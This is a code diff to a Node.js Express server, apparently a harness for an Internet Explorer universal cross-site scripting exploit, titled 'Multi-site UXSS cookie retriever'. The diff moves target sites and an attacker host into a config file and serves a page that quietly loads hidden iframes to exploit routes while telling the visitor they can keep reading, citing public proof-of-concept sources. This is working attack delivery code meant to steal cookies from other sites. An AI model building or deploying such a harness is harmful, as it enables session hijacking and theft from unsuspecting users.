@@ -7,8 +7,9 @@
 // jslint es5: true
 "use strict;";
 
-var targets = ['https://www.facebook.com/robots.txt', 'http://www.dailymotion.com/robots.txt'];
-var thisHost = 'http://192.168.56.1:8080';
+var conf = require('./conf');
+var targets = conf.targets;
+var thisHost = conf.host;
 var express = require('express');
 var url = require('url');
 var cookie = require('cookie');
@@ -55,10 +56,25 @@ app.get('/exploit/:id', function(req, res, next) {
 });
 
 app.use(function(req, res, next) {
-  var page = [];
+  var page = [
+    "<!DOCTYPE html><html><head><title>Multi-site UXSS cookie retriever</title></head><body>"
+  ];
+  page.push('<h1>Multi-size UXSS cookie retriever</h1>');
+  page.push('<p>You can read this content while the page does its work.</p>');
+  page.push('<p>Original exploit: http://www.deusen.co.uk/items/insider3show.3362009741042107/</p>');
+  page.push('<p>Further POC: http://packetstormsecurity.com/files/130308/Microsoft-Internet-Explorer-Universal-XSS-Proof-Of-Concept.html</p>');
+
   for (var k = 0; k < targets.length; k++) {
-    page.push('<iframe style="display:none;" src="/exploit/' + k + '"></iframe>');
+    page.push('<iframe style="display:none;" id="iframe' + k + '"></iframe>');
   }
+
+  page.push('<script>function loadAll() {');
+  for (var i = 0; i < targets.length; i++) {
+    page.push('var ifr = document.getElementById("iframe' + i + '"); ifr.src = "/exploit/' + i + '";');
+  }
+  page.push('} setTimeout(loadAll, 5);');
+  page.push('</script></body></html>');
+
   res.send(page.join('\n'));
 });
 
